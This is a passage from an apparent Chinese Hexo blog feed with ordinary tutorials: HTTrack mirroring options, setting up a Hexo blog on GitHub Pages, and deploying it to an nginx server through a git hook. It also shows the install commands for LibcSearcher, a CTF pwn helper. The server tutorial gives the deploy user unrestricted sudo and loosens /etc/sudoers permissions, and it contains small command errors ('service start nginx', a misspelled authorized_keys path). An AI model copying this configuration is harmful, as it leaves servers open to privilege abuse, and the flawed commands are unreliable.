<h2 id="用户定义的选项N和高级变量提取详情"><a href="#用户定义的选项N和高级变量提取详情" class="headerlink" title="用户定义的选项N和高级变量提取详情"></a>用户定义的选项N和高级变量提取详情</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">%[param:before:after:empty:notfound]</span><br><span class="line">param    参数名称</span><br><span class="line">before   如果找到参数，则在其前面加上字符串</span><br><span class="line">after    找到参数后要追加的字符串</span><br><span class="line">notfound 如果找不到参数，则替换字符串</span><br><span class="line">empty    如果参数为空，则替换字符串</span><br></pre></td></tr></table></figure>

<p>除第一个字段（参数名）外，所有字段都可以为空</p>
<h2 id="选项K详情"><a href="#选项K详情" class="headerlink" title="选项K详情"></a>选项K详情</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">K0  foo.cgi?q=45  -&gt;  foo4B54.html?q=45 (relative URI, default)</span><br><span class="line">K                 -&gt;  http://www.foobar.com/folder/foo.cgi?q=45 (absolute URL) (--keep-links[=N])</span><br><span class="line">K3                -&gt;  /folder/foo.cgi?q=45 (absolute URI)</span><br><span class="line">K4                -&gt;  foo.cgi?q=45 (original URL)</span><br><span class="line">K5                -&gt;  http://www.foobar.com/folder/foo4B54.html?q=45 (transparent proxy URL)</span><br></pre></td></tr></table></figure>

<h2 id="快捷操作"><a href="#快捷操作" class="headerlink" title="快捷操作"></a>快捷操作</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">--mirror      &lt;URLs&gt; *制作站点的镜像 (default)</span><br><span class="line">--get         &lt;URLs&gt;  获取指定的文件，不要查找其他URL (-qg)</span><br><span class="line">--list   &lt;text file&gt;  添加此文本文件中的所有URL (-%L)</span><br><span class="line">--mirrorlinks &lt;URLs&gt;  镜像一级页面中的所有链接 (-Y)</span><br><span class="line">--testlinks   &lt;URLs&gt;  测试页面中的链接 (-r1p0C0I0t)</span><br><span class="line">--spider      &lt;URLs&gt;  爬取站点，用于测试链接:报告错误和警告 (-p0C0I0t)</span><br><span class="line">--testsite    &lt;URLs&gt;  与--spider相同</span><br><span class="line">--skeleton    &lt;URLs&gt;  创建镜像，但只获取html文件 (-p1)</span><br><span class="line">--update              更新镜像，无需确认 (-iC2)</span><br><span class="line">--continue            继续镜像，无需确认 (-iC1)</span><br><span class="line"></span><br><span class="line">--catchurl            创建一个临时代理来捕获一个URL或一个表单post URL</span><br><span class="line">--clean               删除缓存和日志文件</span><br><span class="line"></span><br><span class="line">--http10              强制http/1.0请求 (-%h)</span><br></pre></td></tr></table></figure>

<h1 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h1><ol>
<li><p>只镜像站点<code>www.someweb.com/bob/</code>；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">httrack www.someweb.com/bob/</span><br></pre></td></tr></table></figure></li>
<li><p>将两个站点镜像在一起（带有共享链接），并接受.com站点上的任何.jpg文件；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">httrack www.someweb.com/bob/ www.anothertest.com/mike/ +*.com/*.jpg -mime:application/*</span><br></pre></td></tr></table></figure></li>
<li><p>从bobby.html开始获取所有文件，具有6个链接深度，并且可以在web上到处访问；</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">httrack www.someweb.com/bob/bobby.html +* -r6</span><br></pre></td></tr></table></figure></li>
<li><p>使用代理在<code>www.someweb.com/bob/bobby.html</code>上运行爬虫；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">httrack www.someweb.com/bob/bobby.html --spider -P proxy.myhost.com:8080</span><br></pre></td></tr></table></figure></li>
<li><p>更新当前文件夹中的镜像 ；</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">httrack --update</span><br></pre></td></tr></table></figure></li>
<li><p>进入交互模式；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">httrack</span><br></pre></td></tr></table></figure></li>
<li><p>在当前文件夹中继续镜像；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">httrack --<span class="built_in">continue</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.httrack.com/html/fcguide.html">Httrack Users Guide</a></p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>HTTrack</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo搭建博客并部署到github上</title>
    <url>/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E5%B9%B6%E9%83%A8%E7%BD%B2%E5%88%B0github%E4%B8%8A.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        最近<code>hexo</code>框架的个人博客比较潮流，自己也搭建了一个，简单总结了一下过程，适合像我这样的小白上手体验。<span id="more"></span></p>
<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><ul>
<li><p>安装 <a href="https://git-scm.com/">git</a></p>
</li>
<li><p>安装 <a href="https://nodejs.org/zh-cn/">node.js</a></p>
<p>备注：官方网站下载安装包，直接安装即可。</p>
</li>
</ul>
<h1 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装<code>Hexo</code></h1><p>使用<code>npm</code>安装<code>hexo</code>即可，命令如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<h1 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h1><h2 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h2><ol>
<li><p>打开命令行，在命令行输入如下命令，初始化项目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init &lt;folder&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;floder&gt;</code>是本地的文件目录，例如我用的是<code>D:\hexo\Leeyuxun</code>，如果不输入<code>&lt;folder&gt;</code>，会默认在当前目录初始化目录。</p>
</li>
<li><p>进入<code>&lt;folder&gt;</code>目录，安装依赖包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd &lt;floder&gt;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>在<code>&lt;folder&gt;</code>目录生成文件包括：</p>
<ul>
<li><code>scaffolds </code> : 脚手架，用于存放创建文章时的模版;</li>
<li><code>source</code> ：用于存放博客原文件、其他静态资源文件；</li>
<li><code>themes</code> : 用于存放主题，默认主题为<code>landscape</code>；</li>
<li><code>_config.yml</code> : <code>Hexo</code>和站点的配置文件，可设置博客的名字、标题、作者、链接格式等相关内容；</li>
</ul>
</li>
<li><p>启动本地服务</p>
<p>在<code>&lt;floder&gt;</code>目录下执行如下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>即可在浏览器输入<code>localhost:4000</code>访问，第一次初始化的时候hexo已经写了一篇名为 Hello World 的文章</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1569402084705.png" alt="1569402084705"></p>
</li>
</ol>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>修改博客根目录下的<code>_config.yml</code>文件，对<code>hexo</code>进行相关配置。</p>
<ol>
<li><p>站点配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hexo</span>			<span class="comment">#网站标题</span></span><br><span class="line"><span class="attr">subtitle:</span>			<span class="comment">#网站子标题</span></span><br><span class="line"><span class="attr">description:</span>		<span class="comment">#网站描述</span></span><br><span class="line"><span class="attr">keywords:</span>			<span class="comment">#网站搜索关键字</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">John</span> <span class="string">Doe</span>	<span class="comment">#网站作者</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">en</span>		<span class="comment">#网站语言，具体如何表示查看主题文件下的language下的文件</span></span><br><span class="line"><span class="attr">timezone:</span>			<span class="comment">#网站时区，默认是自己电脑时区		</span></span><br></pre></td></tr></table></figure></li>
<li><p>网址配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">http://yoursite.com</span>				<span class="comment">#网站网址</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span>									<span class="comment">#网站根目录</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span>	<span class="comment">#文章的永久链接格式</span></span><br><span class="line"><span class="attr">permalink_defaults:</span>						<span class="comment">#文章的永久链接格式的默认值</span></span><br></pre></td></tr></table></figure></li>
<li><p>目录配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span>			<span class="comment">#存放博文</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span>			<span class="comment">#存放静态网页文件</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span>				<span class="comment">#标签文件夹</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span>		<span class="comment">#归档文件夹</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span>	<span class="comment">#分类文件夹</span></span><br><span class="line"><span class="attr">code_dir:</span> <span class="string">downloads/code</span>	<span class="comment">#Include code文件夹</span></span><br><span class="line"><span class="attr">i18n_dir:</span> <span class="string">:lang</span>				<span class="comment">#i18n(国际化)文件夹</span></span><br><span class="line"><span class="attr">skip_render:</span>				<span class="comment">#跳过指定文件的渲染</span></span><br></pre></td></tr></table></figure>

<p>3.文章配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Writing</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span> 	<span class="comment">#新建博文文件名称</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span>		<span class="comment">#预设布局</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span>			<span class="comment">#不将标题每个单词首字母转换成大写</span></span><br><span class="line"><span class="attr">external_link:</span> <span class="literal">true</span>			<span class="comment">#在新标签中打开链接</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span>			<span class="comment">#设置文件名称不变(1为小写，2为大写，0为不变)</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span>		<span class="comment">#不显示草稿</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">false</span>	<span class="comment">#不启动Asset文件夹</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span>		<span class="comment">#不把链接改为与根目录的相对位址</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span>				<span class="comment">#显示未来的文章</span></span><br><span class="line"><span class="attr">highlight:</span>					<span class="comment">#高亮代码设置</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>				</span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span>			<span class="comment">#显示行号</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span>		<span class="comment">#不自动检测</span></span><br><span class="line">  <span class="attr">tab_replace:</span>				<span class="comment">#将Tab替换成其它字符串</span></span><br></pre></td></tr></table></figure></li>
<li><p>分类和标签配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Category &amp; Tag</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span>		<span class="comment">#默认分类</span></span><br><span class="line"><span class="attr">category_map:</span>						<span class="comment">#分类别名</span></span><br><span class="line"><span class="attr">tag_map:</span>							<span class="comment">#标签别名</span></span><br></pre></td></tr></table></figure></li>
<li><p>时间日期格式</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Date / Time format</span></span><br><span class="line"><span class="attr">date_format:</span> <span class="string">YYYY-MM-DD</span>			</span><br><span class="line"><span class="attr">time_format:</span> <span class="string">HH:mm:ss</span></span><br></pre></td></tr></table></figure></li>
<li><p>分页配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Pagination</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="number">10</span>						<span class="comment">#每页显示的文章量为10篇</span></span><br><span class="line"><span class="attr">pagination_dir:</span> <span class="string">page</span>				<span class="comment">#分页目录</span></span><br></pre></td></tr></table></figure></li>
<li><p>主题配置</p>
<p>默认主题为<code>landscape</code> ，可以从<a href="http://hexo.io/themes/%E4%B8%8B%E8%BD%BD%E5%85%B6%E5%AE%83%E4%B8%BB%E9%A2%98%E5%88%B0themes%E4%B8%AD%E6%94%B9%E5%8F%98%E4%B8%BB%E9%A2%98%EF%BC%9B">http://hexo.io/themes/下载其它主题到themes中改变主题；</a></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">landscape</span></span><br></pre></td></tr></table></figure></li>
<li><p>部署配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span>	<span class="string">git</span>							<span class="comment">#设置发布类型，这里选择git</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="部署到github"><a href="#部署到github" class="headerlink" title="部署到github"></a>部署到<code>github</code></h1><h2 id="注册github"><a href="#注册github" class="headerlink" title="注册github"></a>注册<code>github</code></h2><p>点击<a href="http://www.github.com进行注册即可/">www.github.com进行注册即可</a></p>
<h2 id="创建项目目标代码库"><a href="#创建项目目标代码库" class="headerlink" title="创建项目目标代码库"></a>创建项目目标代码库</h2><p>点击<code>New repository</code>，创建新的项目库，项目名称为<code>用户名.github.io</code>，勾选<code>Initialize this respository with a ERADME</code>，点击<code>Creating resporitory</code>，创建新的项目库</p>
<h2 id="设置SSH密钥"><a href="#设置SSH密钥" class="headerlink" title="设置SSH密钥"></a>设置<code>SSH</code>密钥</h2><ol>
<li><p>安装插件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></li>
<li><p>修改站点配置文件<code>_config.yml</code>，补充<code>deploy</code>信息</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span> </span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:github用户名/github用户名.github.io.git</span> </span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span> </span><br></pre></td></tr></table></figure></li>
<li><p>在<code>&lt;folder&gt;</code>目录下打开命令行，输入如下命令生成<code>SSH密钥</code>，后续过程直接回车即可；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh-keygen -t rsa -C <span class="string">&quot;email@example.com&quot;</span></span> </span><br><span class="line"> //github注册邮箱地址</span><br></pre></td></tr></table></figure>

<p>生成的密钥一般会存储在<code>C:\users\用户名\.ssh</code>目录下，密钥存储文件为<code>id_rsa</code>，公钥存储文件为<code>id_rsa.pub</code>。</p>
</li>
<li><p>配置github账户</p>
<p>登录<code>github</code>账户，点击右上角头像，选择<code>Settings</code>，然后点击<code>SSH and GPG Keys</code>，点击<code>New SSH  key</code>，填一个自己喜欢的标题，然后将<code>id_rsa.pub</code>得内容复制粘贴到<code>key</code>中，点击<code>Add SSH key</code>即可完成。</p>
</li>
<li><p>测试</p>
<p>打开命令行，输入如下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<p>之后会显示如下内容，表示<code>ssh</code>密钥配置正确。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">You have successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure></li>
<li><p>配置<code>Git</code>个人信息</p>
<p>本地打开命令行，输入如下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;github用户名&quot;</span><br><span class="line">git config --global user.email  &quot;github邮箱&quot;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="生成静态文件并上传"><a href="#生成静态文件并上传" class="headerlink" title="生成静态文件并上传"></a>生成静态文件并上传</h2><p>输入以下命令，在本地生成静态文件，并上传至github</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo g	#本地生成静态文件</span><br><span class="line">hexo d	#将项目上传至github</span><br></pre></td></tr></table></figure>

<p>此时登录<code>用户名.github.io</code>即可访问自己的个人博客。</p>
<h1 id="Hexo主题设置"><a href="#Hexo主题设置" class="headerlink" title="Hexo主题设置"></a><code>Hexo</code>主题设置</h1><p>下载<a href="https://github.com/theme-next/hexo-theme-next">NexT</a>主题，保存至<code>themes</code>目录下，在<code>&lt;folder&gt;</code>目录下更改<code>_config.yml</code>文件<code>theme: landscape</code>为<code>theme: next</code>。</p>
<h2 id="菜单配置"><a href="#菜单配置" class="headerlink" title="菜单配置"></a>菜单配置</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">home</span>					<span class="comment">#首页</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">th</span>	<span class="comment">#分类</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">archive</span>	<span class="comment">#归档</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">tags</span>				<span class="comment">#标签</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">user</span>			<span class="comment">#关于</span></span><br><span class="line">  <span class="attr">schedule:</span> <span class="string">/schedule/</span> <span class="string">||</span> <span class="string">calendar</span>	<span class="comment">#日志</span></span><br><span class="line">  <span class="attr">sitemap:</span> <span class="string">/sitemap.xml</span> <span class="string">||</span> <span class="string">sitemap</span>	<span class="comment">#站点导航</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">/404/</span> <span class="string">||</span> <span class="string">heartbeat</span>	<span class="comment">#爱心</span></span><br></pre></td></tr></table></figure>

<h2 id="内容显示配置"><a href="#内容显示配置" class="headerlink" title="内容显示配置"></a>内容显示配置</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Content</span></span><br><span class="line"><span class="attr">excerpt_link:</span> <span class="string">阅读全文</span>				<span class="comment">#设置查看全文的按钮显示文本</span></span><br><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span>					   <span class="comment">#是否开启弹出层效果</span></span><br></pre></td></tr></table></figure>

<h2 id="侧边栏配置"><a href="#侧边栏配置" class="headerlink" title="侧边栏配置"></a>侧边栏配置</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sidebar</span></span><br><span class="line"><span class="attr">sidebar:</span> <span class="string">right</span>    					<span class="comment">#侧边栏展示的方向</span></span><br><span class="line"><span class="attr">widgets:</span>          					<span class="comment">#侧边栏添加的组件配置</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">category</span>        					<span class="comment">#显示分类</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">tag</span>             					<span class="comment">#显示标签</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">tagcloud</span>        					<span class="comment">#显示标签云</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">archive</span>         					<span class="comment">#显示归档</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">recent_posts</span>    					<span class="comment">#显示最近发布</span></span><br></pre></td></tr></table></figure>

<h1 id="Hexo常用命令"><a href="#Hexo常用命令" class="headerlink" title="Hexo常用命令"></a><code>Hexo</code>常用命令</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new &quot;postName&quot; 		#新建文章</span><br><span class="line">hexo new page &quot;pageName&quot; 			#新建页面</span><br><span class="line">hexo generate 						#生成静态页面</span><br><span class="line">hexo server 						#开启预览访问</span><br><span class="line">hexo deploy 						#部署到GitHub</span><br><span class="line">hexo help  							#查看帮助</span><br><span class="line">hexo version  						#查看Hexo的版本</span><br></pre></td></tr></table></figure>

<p>缩写如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo n == hexo new</span><br><span class="line">hexo g == hexo generate</span><br><span class="line">hexo s == hexo server</span><br><span class="line">hexo d == hexo deploy</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>搭建网站</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>NexT</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客同时部署到GitHub Page和个人服务器</title>
    <url>/Hexo%E5%8D%9A%E5%AE%A2%E5%90%8C%E6%97%B6%E9%83%A8%E7%BD%B2%E5%88%B0GitHub-Page%E5%92%8C%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前是把博客部署到了GitHub Page上的，但是使用一段时间后发现内网访问太慢，于是打算将该博客同时部署到GitHub Page和个人服务器上，将个人博客部署到GitHub Page教程可以参考本人之前的博客：<a href="https://leeyuxun.github.io/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E5%B9%B6%E9%83%A8%E7%BD%B2%E5%88%B0github%E4%B8%8A.html">Hexo搭建博客并部署到github上</a>，本博客记录了个人服务器的部署流程；<span id="more"></span></p>
<h1 id="服务器环境"><a href="#服务器环境" class="headerlink" title="服务器环境"></a>服务器环境</h1><ol>
<li><p>ubuntu 18.04</p>
</li>
<li><p>git 2.17.1</p>
</li>
<li><p>nginx 1.14.0</p>
</li>
</ol>
<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># apt install git</span></span><br></pre></td></tr></table></figure>

<h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># apt install nginx</span></span><br></pre></td></tr></table></figure>

<p>输入如下命令启动nginx，在浏览器中输入服务器公网地址即可查看nginx默认界面；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># service start nginx</span></span><br></pre></td></tr></table></figure>

<h2 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h2><p>进入nginx的配置文件目录，打开default文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># cd /etc/nginx/sites-available</span></span><br><span class="line">root@localhost:/etc/nginx/sites-available<span class="comment"># vim default</span></span><br></pre></td></tr></table></figure>

<p>将<code>root /var/www/html</code>修改为<code>root /var/www/html/blog</code>，即设置本博客网站的根目录；</p>
<h2 id="创建git用户"><a href="#创建git用户" class="headerlink" title="创建git用户"></a>创建git用户</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># adduser git</span></span><br></pre></td></tr></table></figure>

<p>赋予git用户权限，打开<code>/etc/sudoers</code>文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># chmod 740 /etc/sudoers</span></span><br><span class="line">root@localhost:~<span class="comment"># vim /etc/sudoers</span></span><br></pre></td></tr></table></figure>

<p>找到如下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Allow root to run any commands anywhere</span></span><br><span class="line">root    ALL=(ALL)    ALL</span><br></pre></td></tr></table></figure>

<p>在下面添加一行内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git     ALL=(ALL)    ALL</span><br></pre></td></tr></table></figure>

<p>保存退出并改回权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># chmod 400 /etc/sudoers</span></span><br></pre></td></tr></table></figure>

<h2 id="设置SSH"><a href="#设置SSH" class="headerlink" title="设置SSH"></a>设置SSH</h2><p>切换为git用户，创建 <code>~/.ssh</code>文件夹和<code>~/.ssh/authorized_keys</code>文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># su git</span></span><br><span class="line">git@localhost:/root$ <span class="built_in">mkdir</span> ~/.ssh</span><br><span class="line">git@localhost:/root$ vim ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>将本地用户目录下的<code>.ssh</code>文件夹下的<code>id_rsa.pub</code>文件里的内容复制到<code>authorized_keys</code>中并赋予相应的权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git@localhost:~$ <span class="built_in">chmod</span> 600 ~/.ssh/authorzied_keys</span><br><span class="line">git@localhost:~$ <span class="built_in">chmod</span> 700 ~/.ssh</span><br></pre></td></tr></table></figure>

<p>此时，在本地客户端输入<code>ssh -v git@服务器ip地址</code>即可进行ssh登录；</p>
<h2 id="git仓库设置"><a href="#git仓库设置" class="headerlink" title="git仓库设置"></a>git仓库设置</h2><p>创建git仓库目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># mkdir /var/repo</span></span><br></pre></td></tr></table></figure>

<p>将repo目录及其子目录用户组设置为git</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># chown -R git:git /var/repo/</span></span><br></pre></td></tr></table></figure>

<p>同时将网站根目录的用户组设置为git</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># chown -R git:git /var/www/html/blog</span></span><br></pre></td></tr></table></figure>

<h2 id="git-hooks自动化部署博客"><a href="#git-hooks自动化部署博客" class="headerlink" title="git-hooks自动化部署博客"></a>git-hooks自动化部署博客</h2><p>服务器建立裸库，使用git用户登录，确保git用户拥有仓库所有权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># su git</span></span><br><span class="line">git@localhost:/root$ <span class="built_in">cd</span> /var/repo/</span><br><span class="line">git@localhost:/var/repo$ git init --bare blog.git</span><br></pre></td></tr></table></figure>

<p>使用git-hooks同步网站根目录，编辑<code>/var/repo/blog.git/hooks</code>文件夹下的<code>post-update</code>文件内容如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">git --work-tree=/var/www/html/blog --git-dir=/var/repo/blog.git checkout -f</span><br></pre></td></tr></table></figure>

<p>保存后，赋予该文件可执行权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git@localhost:/var/repo/blog.git/hooks$ <span class="built_in">chmod</span> +x post-update</span><br></pre></td></tr></table></figure>

<h2 id="配置hexo根目录下的-config-yml文件"><a href="#配置hexo根目录下的-config-yml文件" class="headerlink" title="配置hexo根目录下的_config.yml文件"></a>配置hexo根目录下的_config.yml文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: </span><br><span class="line">        github: git@github.com:Leeyuxun/Leeyuxun.github.io.git,master</span><br><span class="line">        hexo: git@服务器IP:/var/repo/blog.git,master//添加内容</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>在本地客户端输入如下内容，进行测试部署</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g -d</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>搭建网站</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>github page</tag>
        <tag>VPS</tag>
      </tags>
  </entry>
  <entry>
    <title>LibcSearcher介绍</title>
    <url>/LibcSearcher%E4%BB%8B%E7%BB%8D.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>LibcSearcher是针对pwn的python库，可以通过它寻找libc版本。<span id="more"></span></p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">python2 setup.py develop</span><br><span class="line">python3 setup.py develop</span><br></pre></td></tr></table></figure>

